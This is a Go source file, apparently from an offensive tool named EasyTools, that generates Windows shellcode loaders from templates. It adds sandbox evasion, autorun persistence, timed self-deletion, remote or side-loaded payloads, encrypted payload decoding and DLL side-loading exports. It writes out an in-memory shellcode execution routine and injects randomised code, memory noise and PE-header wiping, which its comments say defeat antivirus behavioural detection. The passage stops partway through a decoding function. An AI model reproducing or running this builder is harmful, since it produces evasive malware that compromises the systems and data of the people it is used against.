package util

import (
	"EasyTools/app/bypass/shell/encode"
	"EasyTools/app/bypass/shell/loader"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// 1.判断文件是否存在
func FileExists(filePath string) (bool, error) {
	_, err := os.Stat(filePath)
	if os.IsNotExist(err) {
		return false, fmt.Errorf("文件 %s 不存在", filePath)
	}
	return err == nil, err
}

// 3.生成go文件 bin文件 模板文件 生成的文件路径
func GenGoFile(loaderName, loadWay, EncodeWay, passBoxWay, autoRun, localAutoDelete, localAutoDeleteTime, yunAutoDelete, yunAutoDeleteTime string, selectedFunctionName string, allFunctions []string, selectedFunctions []string) (filePath string, err error) {

	var fullLoaderStr string
	// 根据loaderName获取指定的shellcode模板内容,然后使用DecodeString替换里面的内容即可
	raw, ok := loader.Modules[loaderName]
	if !ok || len(raw) == 0 {
		// 模板不存在：返回明确错误，调用方直接展示给用户
		return "", fmt.Errorf("loader 模板 %s 不存在", loaderName)
	}
	loaderStr := string(raw)

	if passBoxWay == "双击运行" {
		// 替换沙箱检测代码
		fullLoaderStr = strings.ReplaceAll(loaderStr, "//__IMPORT_SandBox__", encode.SandboxString[1])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Func__", encode.SandboxString[2])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[3])
	} else if passBoxWay == "命令行运行" {
		// 替换沙箱检测代码
		fullLoaderStr = strings.ReplaceAll(loaderStr, "//__IMPORT_SandBox__", encode.SandboxString[4])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Func__", encode.SandboxString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[5])
	} else {
		// 避免未开启沙箱检测导致模板无法渲染
		fullLoaderStr = strings.ReplaceAll(loaderStr, "//__IMPORT_SandBox__", encode.SandboxString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Func__", encode.SandboxString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[0])
	}

	// 处理自动删除：导入和函数只添加一次（如果本地或云端任一启用），但调用分别配置
	if localAutoDelete == "true" || yunAutoDelete == "true" {
		// 导入和函数只添加一次
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_AutoDelete__", encode.AutoDeleteString[1])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Func__", encode.AutoDeleteString[2])
	} else {
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_AutoDelete__", encode.AutoDeleteString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Func__", encode.AutoDeleteString[0])
	}

	// 处理云端自动删除调用
	if yunAutoDelete == "true" && yunAutoDeleteTime != "" {
		yunAutoDeleteMain := strings.Replace(
			encode.AutoDeleteString[3],
			"{{.Deadline}}",
			yunAutoDeleteTime,
			-1,
		)
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", yunAutoDeleteMain)
	} else {
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", encode.AutoDeleteString[0])
	}

	// 处理本地自动删除调用
	if localAutoDelete == "true" && localAutoDeleteTime != "" {
		localAutoDeleteMain := strings.Replace(
			encode.AutoDeleteString[3],
			"{{.Deadline}}",
			localAutoDeleteTime,
			-1,
		)
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", localAutoDeleteMain)
	} else {
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", encode.AutoDeleteString[0])
	}

	if autoRun == "true" {
		// 替换自启动检测代码
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_AutoRun__", encode.AutoRunString[1])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Func__", encode.AutoRunString[2])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[3])
	} else {
		// 避免未开启自启动导致模板无法渲染
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_AutoRun__", encode.AutoRunString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Func__", encode.AutoRunString[0])
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[0])
	}

	if loadWay == "远程" {
		// 添加import
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_YuanCheng__", encode.YuanChengDecodeString[0])
		// 替换//__DECODE_Func__
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Func__", encode.YuanChengDecodeString[1])
		// 替换//__DECODE_Main__
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", encode.YuanChengDecodeString[2])

		//使用xor模板
		// 添加import
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.XorDecodeString[0])
		// 替换//__DECODE_Func__
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.XorDecodeString[1])
	} else if loadWay == "分离" {
		// 添加import_FenLi
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT_FenLi__", encode.FenliDecodeString[0])
		// 添加FenLi_Func
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Func__", encode.FenliDecodeString[1])
		// 添加FenLi_Main
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", encode.FenliDecodeString[2])

		//使用xor模板
		// 添加import
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.XorDecodeString[0])
		// 替换//__DECODE_Func__
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.XorDecodeString[1])

	} else if loadWay == "一体" || loadWay == "白加黑" {
		if EncodeWay == "aes" {
			// 添加import
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.AesDecodeString[0])
			// 替换//__DECODE_Func__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.AesDecodeString[1])
			// 替换//__DECODE_Main__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.AesDecodeString[2])
		} else if EncodeWay == "xor" {
			// 添加import
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.XorDecodeString[0])
			// 替换//__DECODE_Func__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.XorDecodeString[1])
			// 替换//__DECODE_Main__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.XorDecodeString[2])
		} else if EncodeWay == "chacha20" {
			// 添加import
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.ChaCha20DecodeString[0])
			// 替换//__DECODE_Func__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.ChaCha20DecodeString[1])
			// 替换//__DECODE_Main__
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.ChaCha20DecodeString[2])
		} else if EncodeWay == "otp" {
			// OTP 一次一密：不引入额外 import / 无需解码函数（就地解码由生成期注入完成），
			// __DECODE_Main__ 处仅把 密文‖密钥 blob 内联为 byteArray（2N 长度，不解密）。
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__IMPORT__", encode.OtpDecodeString[0])
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Func__", encode.OtpDecodeString[1])
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.OtpDecodeString[2])
		}

		// 白加黑模式下，为所有函数生成代码
		if loadWay == "白加黑" {
			// 创建选中函数的集合，便于快速查找
			selectedFuncSet := make(map[string]bool)
			for _, fn := range selectedFunctions {
				selectedFuncSet[fn] = true
			}

			// 如果提供了 allFunctions，为所有函数生成代码
			if len(allFunctions) > 0 {

				// 为所有函数生成代码
				var exportFuncs []string
				for _, funcName := range allFunctions {
					// 函数声明
					exportDeclare := fmt.Sprintf("//export %s", funcName)
					exportDefine := fmt.Sprintf("func %s() C.int {", funcName)

					// 判断是否选中
					if selectedFuncSet[funcName] {
						// 注意：白加黑模式下不包含 //__FenLi_Main__ 和 //__YuanCheng_Main__，因为这些是分离和远程模式特有的
						funcBody := "\t//__AutoYunDelete_Main__\n" +
							"\t//__AutoDelete_Main__\n" +
							"\t//__SANDBOX_Main__\n" +
							"\t//__AutoRun_Main__\n" +
							"\t//__DECODE_Main__\n\n" +
							"\tkernel32 := windows.NewLazyDLL(\"kernel32.dll\")\n" +
							"\tntdll := windows.NewLazyDLL(\"ntdll.dll\")\n\n" +
							"\tUser32 := windows.NewLazyDLL(\"User32.dll\")\n" +
							"\tVirtualAlloc := kernel32.NewProc(\"VirtualAlloc\")\n" +
							"\tVirtualProtect := kernel32.NewProc(\"VirtualProtect\")\n" +
							"\tEnumChildWindows := User32.NewProc(\"EnumChildWindows\")\n" +
							"\tRtlMoveMemory := ntdll.NewProc(\"RtlMoveMemory\")\n\n" +
							"\taddr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteArray)), 0x1000, 0x04)\n" +
							"\tRtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteArray[0])), uintptr(len(byteArray)))\n" +
							"\toldProtect := 0x04\n" +
							"\t_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteArray)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))\n" +
							"\tEnumChildWindows.Call(0, addr, 0)\n" +
							"\treturn 0"
						exportFuncs = append(exportFuncs, fmt.Sprintf("%s\n%s\n%s\n}", exportDeclare, exportDefine, funcBody))
					} else {
						// 未选中的函数：只返回0
						exportFuncs = append(exportFuncs, fmt.Sprintf("%s\n%s\n\treturn 0\n}", exportDeclare, exportDefine))
					}
				}

				// 模板格式：//__EXPORT_FUNCTIONS_START__ ... //__EXPORT_FUNCTIONS_END__
				exportFuncsCode := strings.Join(exportFuncs, "\n\n")
				startMarker := "//__EXPORT_FUNCTIONS_START__"
				endMarker := "//__EXPORT_FUNCTIONS_END__"

				// 查找开始标记和结束标记的位置
				startIdx := strings.Index(fullLoaderStr, startMarker)
				endIdx := strings.Index(fullLoaderStr, endMarker)

				if startIdx != -1 && endIdx != -1 && endIdx > startIdx {

					// 找到开始标记所在行的开始位置（向前查找换行符）
					startLineStart := strings.LastIndex(fullLoaderStr[:startIdx], "\n")
					if startLineStart == -1 {
						startLineStart = 0
					} else {
						startLineStart++ // 跳过换行符
					}

					// 找到结束标记所在行的结束位置（向后查找换行符）
					endLineEnd := strings.IndexByte(fullLoaderStr[endIdx:], '\n')
					if endLineEnd == -1 {
						// 结束标记在文件末尾
						fullLoaderStr = fullLoaderStr[:startLineStart] + exportFuncsCode
					} else {
						// 替换从开始标记行到结束标记行（包括这两行）的所有内容
						endReplacePos := endIdx + endLineEnd + 1
						fullLoaderStr = fullLoaderStr[:startLineStart] + exportFuncsCode + "\n" + fullLoaderStr[endReplacePos:]
					}
				} else {
					// 兼容旧格式：查找旧的占位符
					oldPattern := "//__EXPORT_FUNC_DECLARE__\n//__EXPORT_FUNC_DEFINE__"
					if idx := strings.Index(fullLoaderStr, oldPattern); idx != -1 {
						// 查找 func main 的位置，替换从占位符到 func main 之间的所有内容
						funcMainIdx := strings.Index(fullLoaderStr[idx:], "\nfunc main")
						if funcMainIdx != -1 {
							fullLoaderStr = fullLoaderStr[:idx] + exportFuncsCode + "\n" + fullLoaderStr[idx+funcMainIdx+1:]
						}
					} else {
						// 即使占位符未找到，我们也应该尝试添加函数代码
						// 在 func main() 之前插入函数代码
						funcMainIdx := strings.Index(fullLoaderStr, "\nfunc main()")
						if funcMainIdx != -1 {
							fullLoaderStr = fullLoaderStr[:funcMainIdx] + "\n\n" + exportFuncsCode + "\n" + fullLoaderStr[funcMainIdx:]
						}
					}
				}

				// 替换函数代码中的占位符（这些占位符在函数代码生成时被保留）
				if passBoxWay == "双击运行" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[3])
				} else if passBoxWay == "命令行运行" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[5])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[0])
				}

				// 处理云端自动删除调用
				if yunAutoDelete == "true" && yunAutoDeleteTime != "" {
					yunAutoDeleteMain := strings.Replace(
						encode.AutoDeleteString[3],
						"{{.Deadline}}",
						yunAutoDeleteTime,
						-1,
					)
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", yunAutoDeleteMain)
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", encode.AutoDeleteString[0])
				}

				// 处理本地自动删除调用
				if localAutoDelete == "true" && localAutoDeleteTime != "" {
					localAutoDeleteMain := strings.Replace(
						encode.AutoDeleteString[3],
						"{{.Deadline}}",
						localAutoDeleteTime,
						-1,
					)
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", localAutoDeleteMain)
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", encode.AutoDeleteString[0])
				}

				if autoRun == "true" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[3])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[0])
				}

				// 白加黑模式下，不应该有 //__FenLi_Main__ 和 //__YuanCheng_Main__ 占位符
				// 但为了兼容性，如果存在则替换为空字符串
				if loadWay == "分离" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", encode.FenliDecodeString[2])
				} else if loadWay == "白加黑" {
					// 白加黑模式下，这些占位符应该为空（因为函数代码中已经移除了）
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", "")
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", encode.FenliDecodeString[0])
				}

				if loadWay == "远程" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", encode.YuanChengDecodeString[2])
				} else if loadWay == "白加黑" {
					// 白加黑模式下，这些占位符应该为空（因为函数代码中已经移除了）
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", "")
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", encode.YuanChengDecodeString[0])
				}

				// 替换解码相关的占位符
				if EncodeWay == "aes" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.AesDecodeString[2])
				} else if EncodeWay == "xor" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.XorDecodeString[2])
				} else if EncodeWay == "chacha20" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.ChaCha20DecodeString[2])
				} else if EncodeWay == "otp" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.OtpDecodeString[2])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", "")
				}
			} else {
				// 如果没有提供 allFunctions，则使用兼容模式（单个函数）
				funcName := selectedFunctionName
				if funcName == "" {
					// 如果没有选择函数，使用默认函数名
					funcName = "GetAdaptersAddresses"
				}

				// 生成单个函数的代码
				exportDeclare := fmt.Sprintf("//export %s", funcName)
				exportDefine := fmt.Sprintf("func %s() C.int {", funcName)
				// 注意：白加黑模式下不包含 //__FenLi_Main__ 和 //__YuanCheng_Main__，因为这些是分离和远程模式特有的
				funcBody := "\t//__AutoYunDelete_Main__\n" +
					"\t//__AutoDelete_Main__\n" +
					"\t//__SANDBOX_Main__\n" +
					"\t//__AutoRun_Main__\n" +
					"\t//__DECODE_Main__\n\n" +
					"\tkernel32 := windows.NewLazyDLL(\"kernel32.dll\")\n" +
					"\tntdll := windows.NewLazyDLL(\"ntdll.dll\")\n\n" +
					"\tUser32 := windows.NewLazyDLL(\"User32.dll\")\n" +
					"\tVirtualAlloc := kernel32.NewProc(\"VirtualAlloc\")\n" +
					"\tVirtualProtect := kernel32.NewProc(\"VirtualProtect\")\n" +
					"\tEnumChildWindows := User32.NewProc(\"EnumChildWindows\")\n" +
					"\tRtlMoveMemory := ntdll.NewProc(\"RtlMoveMemory\")\n\n" +
					"\taddr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteArray)), 0x1000, 0x04)\n" +
					"\tRtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteArray[0])), uintptr(len(byteArray)))\n" +
					"\toldProtect := 0x04\n" +
					"\t_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteArray)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))\n" +
					"\tEnumChildWindows.Call(0, addr, 0)\n" +
					"\treturn 0"
				singleFuncCode := fmt.Sprintf("%s\n%s\n%s\n}", exportDeclare, exportDefine, funcBody)

				// 尝试使用新占位符格式
				startMarker := "//__EXPORT_FUNCTIONS_START__"
				endMarker := "//__EXPORT_FUNCTIONS_END__"
				startIdx := strings.Index(fullLoaderStr, startMarker)
				endIdx := strings.Index(fullLoaderStr, endMarker)

				if startIdx != -1 && endIdx != -1 && endIdx > startIdx {
					// 使用新占位符格式
					startLineStart := strings.LastIndex(fullLoaderStr[:startIdx], "\n")
					if startLineStart == -1 {
						startLineStart = 0
					} else {
						startLineStart++
					}
					endLineEnd := strings.IndexByte(fullLoaderStr[endIdx:], '\n')
					if endLineEnd == -1 {
						fullLoaderStr = fullLoaderStr[:startLineStart] + singleFuncCode
					} else {
						endReplacePos := endIdx + endLineEnd + 1
						fullLoaderStr = fullLoaderStr[:startLineStart] + singleFuncCode + "\n" + fullLoaderStr[endReplacePos:]
					}
				} else {
					// 兼容旧格式
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DECLARE__", exportDeclare)
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DEFINE__", exportDefine)
				}

				// 同样需要替换兼容模式函数代码中的占位符
				if passBoxWay == "双击运行" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[3])
				} else if passBoxWay == "命令行运行" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[5])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__SANDBOX_Main__", encode.SandboxString[0])
				}

				// 处理云端自动删除调用
				if yunAutoDelete == "true" && yunAutoDeleteTime != "" {
					yunAutoDeleteMain := strings.Replace(
						encode.AutoDeleteString[3],
						"{{.Deadline}}",
						yunAutoDeleteTime,
						-1,
					)
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", yunAutoDeleteMain)
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoYunDelete_Main__", encode.AutoDeleteString[0])
				}

				// 处理本地自动删除调用
				if localAutoDelete == "true" && localAutoDeleteTime != "" {
					localAutoDeleteMain := strings.Replace(
						encode.AutoDeleteString[3],
						"{{.Deadline}}",
						localAutoDeleteTime,
						-1,
					)
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", localAutoDeleteMain)
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoDelete_Main__", encode.AutoDeleteString[0])
				}

				if autoRun == "true" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[3])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__AutoRun_Main__", encode.AutoRunString[0])
				}

				// 兼容模式：白加黑模式下不应该有这些占位符，但为了兼容性处理
				if loadWay == "分离" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", encode.FenliDecodeString[2])
				} else if loadWay == "白加黑" {
					// 白加黑模式下，这些占位符应该为空
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", "")
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__FenLi_Main__", encode.FenliDecodeString[0])
				}

				if loadWay == "远程" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", encode.YuanChengDecodeString[2])
				} else if loadWay == "白加黑" {
					// 白加黑模式下，这些占位符应该为空
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", "")
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__YuanCheng_Main__", encode.YuanChengDecodeString[0])
				}

				if EncodeWay == "aes" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.AesDecodeString[2])
				} else if EncodeWay == "xor" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.XorDecodeString[2])
				} else if EncodeWay == "chacha20" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.ChaCha20DecodeString[2])
				} else if EncodeWay == "otp" {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", encode.OtpDecodeString[2])
				} else {
					fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__DECODE_Main__", "")
				}
			}
		} else {
			// 一体模式下，使用默认函数名（保持原来的逻辑，不需要检查 allFunctions）
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DECLARE__", "//export GetAdaptersAddresses")
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DEFINE__", "func GetAdaptersAddresses() C.int {")
		}
	} else {
		// 其他模式下（分离、远程等），也使用默认函数名（保持原来的逻辑，不需要检查 allFunctions）
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DECLARE__", "//export GetAdaptersAddresses")
		fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "//__EXPORT_FUNC_DEFINE__", "func GetAdaptersAddresses() C.int {")
	}

	// 注入随机但有效的Go代码，确保每次生成的源代码都不一样
	fullLoaderStr = injectRandomGoCode(fullLoaderStr)

	// 通用内存加固（生成期注入）：分配后先写入随机垫片再写入载荷，
	// 打散"新页->整块载荷写入->改RX->执行"行为模型的确定性。
	// 放在 Finalize 之前：其中的 byteArray/addr 引用会随 Finalize 一起随机重命名。
	fullLoaderStr = injectMemoryNoise(fullLoaderStr)

	// OTP 一次一密（就地解码层）：byteArray=密文‖密钥 blob(2N)，载荷拷贝进
	// 可执行区后、翻 RX 之前注入就地 XOR 解码并清零密钥半区（见 injectOtpDecode）。
	// 无标准拷贝序列的模板族（如 loader53 函数指针直执行）回退为函数型解码，
	// 即把 blob 在 Go 堆内解码后截断为明文，再走模板既有执行路径。
	if EncodeWay == "otp" {
		var injected bool
		fullLoaderStr, injected = injectOtpDecode(fullLoaderStr)
		if injected {
			// 就地型成功：移除未使用的函数型回退函数（OtpBlobDecode），避免冗余代码特征
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, encode.OtpDecodeString[1], "")
		} else {
			// 函数型回退：OtpBlobDecode 函数体已随 //__DECODE_Func__ 注入（OtpDecodeString[1]）
			fullLoaderStr = strings.ReplaceAll(fullLoaderStr, "byteArray := //__DATA_OtpEncrypted__", "byteArray := OtpBlobDecode(//__DATA_OtpEncrypted__)")
		}
	}

	// 执行期内存卫生守卫（参考 EasyShell 打 Lotok 的 staging 释放 + PE 头抹除）：
	// 后台延迟巡检，donut/反射加载迁移执行后清空 staging 并撕外来 PE 头；
	// raw shellcode 就地执行时自动跳过。与编码方式正交，对全部标准族模板生效。
	fullLoaderStr = injectMemHygiene(fullLoaderStr)

	// 触发阶段加固：独立线程（32MB 栈）执行 call gadget + 保活，消除"入口返回 → main 返回 →
	// 宿主进程退出/重复加载"这条会让会话上线即掉线的路径（EasyShell 类反射加载载荷要求）
	fullLoaderStr = injectTriggerThread(fullLoaderStr)

	// 生成期静态特征消除：内联加密数据（去除固定文件名/embed 指令）、
	// 随机化沙箱口令 / UA / 休眠时长，并对固定标识符做随机重命名
	finalized, err := FinalizeGeneratedSource(fullLoaderStr)
	if err != nil {
		return "", err
	}
	fullLoaderStr = finalized

	// 兜底清理：未走到替换分支的占位注释行（//__XXX__）整行剔除，
	// 避免模板脚手架/标记特征残留在最终生成源码中
	fullLoaderStr = stripLeftoverPlaceholders(fullLoaderStr)

	// 使用随机go名字
	outputFileName := loaderName + ".go"
	resultFilePath := filepath.Join(os.TempDir(), "EasyTools", "file", outputFileName)
	err = os.WriteFile(resultFilePath, []byte(fullLoaderStr), 0644)
	if err != nil {
		return "", fmt.Errorf("写入生成源码失败: %w", err)
	}
	return resultFilePath, nil
}

// injectMemoryNoise 通用内存加固：在"VirtualAlloc(addr) -> RtlMoveMemory 载荷"之间，
// 用纯 Go 直接内存写先写入一小段随机垫片（随后载荷整段覆盖），打散
// "新RW页 -> 整块载荷写入 -> 改RX -> 执行" 行为序列的确定性。
// 仅当同族模式（分配变量 addr + 载荷变量 byteArray + 已 import unsafe）命中时注入；
// 不命中/变量不符时原样返回，不影响其它模板族。
func injectMemoryNoise(sourceCode string) string {
	copyRe := regexp.MustCompile(`(?m)^([ \t]*)RtlMoveMemory\.Call\(addr, \(uintptr\)\(unsafe\.Pointer\(&byteArray\[0\]\)\), uintptr\(len\(byteArray\)\)\)\r?\n`)
	m := copyRe.FindStringSubmatchIndex(sourceCode)
	if m == nil {
		return sourceCode
	}
	// 前置校验：分配语句确为 VirtualAlloc 写入 addr
	pre := sourceCode[:m[0]]
	if !regexp.MustCompile(`(?m)addr, _, _ := VirtualAlloc\.Call`).MatchString(pre) {
		return sourceCode
	}
	if !regexp.MustCompile(`(?m)["']unsafe["']`).MatchString(pre) && !regexp.MustCompile(`(?m)"unsafe"`).MatchString(pre) {
		return sourceCode
	}
	indent := sourceCode[m[2]:m[3]]
	pad := fmt.Sprintf(`%s{
%s// 内存写入扰动：先写随机垫片，随后载荷整段覆盖（生成期注入，防行为模型命中）
%spadN := len(byteArray) %% 64 + 1
%sif padN > len(byteArray) { padN = len(byteArray) }
%spadBuf := make([]byte, padN)
%sseed := uintptr(addr) ^ uintptr(0x9E3779B9)
%sfor i := range padBuf {
%sseed = seed*1664525 + 1013904223
%spadBuf[i] = byte(seed >> 24)
%s}
%sp := unsafe.Pointer(addr)
%sfor i := 0; i < padN; i++ {
%s*(*byte)(unsafe.Add(p, uintptr(i))) = padBuf[i]
%s}
%s}
`, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent, indent)
	// 插到拷贝行之前
	insPos := m[0]
	return sourceCode[:insPos] + pad + sourceCode[insPos:]
}

// injectOtpDecode OTP 就地解码注入：在"载荷拷贝进可执行区"之后、"翻 RX/执行"之前
// 插入就地 XOR 解码（密文‖密钥 -> 明文，随后清零密钥半区），使 Go 堆中自始至终
// 不存在明文，且静态文件中不存在可提取后本地解密的短密钥或算法常量。
// 锚点：模板文本中任意 proc 变量的 .Call(dest, (uintptr)(unsafe.Pointer(&arr[0])),
// uintptr(len(arr))) 拷贝行（兼容 RtlMoveMemory / RtlCopyMemory / 自定义 proc 名 /
// 跨行书写 / 白加黑多函数体的每处拷贝行）。插入的解码块引用与模板相同的
// dest/arr 标识符，随后随 Finalize 一起随机重命名。
// 返回 (注入后源码, 是否至少命中一处)。未命中说明模板族无标准拷贝序列
// （如 loader53 函数指针直执行族），调用方回退为函数型解码。
func injectOtpDecode(sourceCode string) (string, bool) {
	// 拷贝行（允许换行/空白），(?s) 跨行匹配；分组仅用于提取 dest/arr，
	// "len(<arr>)" 的同一性由下面代码校验（RE2 不支持 \1 回溯引用）
	re := regexp.MustCompile(`(?s)([A-Za-z_][A-Za-z0-9_]*)\.Call\(([A-Za-z_][A-Za-z0-9_]*),\s*\(uintptr\)\(unsafe\.Pointer\(&([A-Za-z_][A-Za-z0-9_]*)\[0\]\)\),\s*uintptr\(len\(`)
	if !regexp.MustCompile(`(?m)^[ \t]*"unsafe"`).MatchString(sourceCode) {
		return sourceCode, false // 无 unsafe 无法注入
	}
	hit := false
	var sb strings.Builder
	sb.Grow(len(sourceCode) + 1024)
	last := 0
	for _, m := range re.FindAllStringSubmatchIndex(sourceCode, -1) {
		// 捕获组：1=proc名 [m2:m3]，2=dest [m4:m5]，3=arr [m6:m7]
		dest := sourceCode[m[4]:m[5]]
		arr := sourceCode[m[6]:m[7]]
		// 校验拷贝源确为载荷（变量名含 byteArray/shellcode/EncByteArray 任一），
		// 且拷贝行确实以 "len(arr)))" 收尾（正则止于 "len("，需跨过整条调用）
		if !regexp.MustCompile(`(?i)byteArray|shellcode|EncByteArray`).MatchString(arr) {
			continue // 非载荷拷贝行，跳过
		}
		tail := sourceCode[m[1]:]
		closeLen := len(arr) + 3 // arr + ")))" 闭合
